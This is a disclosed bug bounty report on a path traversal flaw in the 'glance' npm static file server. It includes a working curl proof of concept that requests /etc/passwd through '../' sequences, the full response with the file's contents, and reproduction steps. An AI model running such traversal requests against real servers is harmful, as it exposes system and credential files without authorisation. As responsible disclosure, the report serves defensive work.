# [glance] Path Traversal in glance static file server allows to read content of arbitrary file

## Report Details
- **Report ID**: 310106
- **URL**: https://hackerone.com/reports/310106
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-01-29T10:34:13.032Z
- **Disclosed**: 2018-03-04T11:54:56.505Z

## Reporter
- **Username**: bl4de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi Guys,

There is Path Traversal vulnerability in ```glance``` module. This issue allows to read arbitrary files from the server, where ```glance``` is installed.

## Module

**glance**

a quick disposable http server for static files

https://www.npmjs.com/package/glance

Stats
33 downloads in the last day
34 downloads in the last week
269 downloads in the last month

~3000 estimated downloads per year

## Description

```glance``` serves files from the server where was installed. No path sanitization is implemented, thus malicious user is able to read content of any file from the server using simple ```curl``` command (adjust number of ../ to reflect your system):

```
curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd
```

The result:

```
me:~/playground/hackerone/Node$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd
*   Trying 127.0.0.1...
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET /../../../../../../etc/passwd HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< content-type: application/octet-stream
< etag: 6d51e6677c898282619137b0c74f0cab
< last-modified: Fri, 26 Jan 2018 12:04:19 +0000
< content-length: 2559
< Date: Mon, 29 Jan 2018 10:23:45 GMT
< Connection: keep-alive
< 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
(..)
guest-cz1ton:x:999:999:Guest:/tmp/guest-cz1ton:/bin/bash
postgres:x:124:131:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
* Connection #0 to host 127.0.0.1 left intact
me:~/playground/hackerone/Node$
```

## Steps To Reproduce:

- install ```glance```:

```
$ npm install glance
```

- run ```glance``` in direcotry of your choice

```
me:~/playground/hackerone/Node$ ./node_modules/glance/bin/glance.js --verbose --dir ./node_modules/
glance serving node_modules/ on port 8080
::1 read node_modules/
::1 read node_modules/bash-color/
::1 read node_modules/bash-color/README.md
::1 read ./
::1 read malware_frame.html
::1 read malware.js
ERR404 ::ffff:127.0.0.1 on ../../../etc/passwd
ERR404 ::ffff:127.0.0.1 on ../../../../etc/passwd
::ffff:127.0.0.1 read ../../../../../etc/passwd
::ffff:127.0.0.1 read ../../../../../etc/passwd
```

You can see in the log above all my requests sent to ```glance```, including ```curl``` requests from PoC, where I was able to traverse directory tree and read content of ```/etc/passwd``` file

## Supporting Material/References:

- Ubuntu 16.04 LTS
- Chromium 66.0.3333.0 (Developer Build) (64-bit) 
- Node.js version: v8.9.4 LTS
- npm version: 5.6.0
- curl 7.47.0


Please feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.

I hope my report will help to keep Node.js ecosystem and its users safe in the future.

Regards,

Rafal 'bl4de' Janicki

## Impact

This vulnerability allows malicious user to read content of arbitrary file from the server.

## Attachments
No attachments
